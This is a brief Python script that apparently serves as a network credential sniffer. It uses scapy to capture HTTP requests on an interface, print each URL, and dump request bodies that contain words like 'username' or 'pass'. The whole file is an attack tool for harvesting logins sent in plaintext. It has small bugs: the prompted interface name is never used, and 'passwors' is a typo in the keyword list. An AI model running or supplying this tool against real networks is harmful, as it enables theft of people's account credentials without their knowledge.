import scapy.all as scapy
from scapy.layers import http
import optparse
parser = optparse.OptionParser()
parser.add_option("--i","--interface",dest="interface",help="ENter INterface")
(values,keys) = parser.parse_args()
interface = values.interface

def sniff_packet(interfaces):
    if interfaces is None:
        interface_input = input("ENter INterface NAme COnnected TO NEtwork")
        interface = interface_input
    scapy.sniff(iface=interfaces,prn=process_packet,store=False)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):#it will print every information printed through http
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        print("\n")
        if packet.haslayer(http.Raw):
            load_1 = packet[scapy.Raw].load#it will only show password asn name
            load_2 = load_1.decode("utf")
            keywords = ['username','name','pass','passwors']
            for keyword in keywords:
                if keyword in load_2:
                    print(load_2)
                    break
sniff_packet(interface)